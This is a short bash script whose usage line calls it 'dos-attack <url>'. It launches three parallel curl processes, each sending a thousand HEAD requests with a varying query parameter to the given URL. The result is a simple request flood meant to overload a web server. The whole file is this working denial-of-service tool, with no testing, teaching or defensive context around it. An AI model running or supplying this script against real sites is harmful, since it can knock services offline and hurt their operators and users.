#!/bin/bash -u

case ${1:-} in
  "" | -h | --help )
    echo "Usage: dos-attack <url>"
    exit
    ;;
esac

function access {
  local url=$1
  local max_count=$2
  curl --head "${url}&foo=[1-${max_count}]" 1>/dev/null
}

url=$1
access "$url" 1000 &
access "$url" 1000 &
access "$url" 1000 &
wait
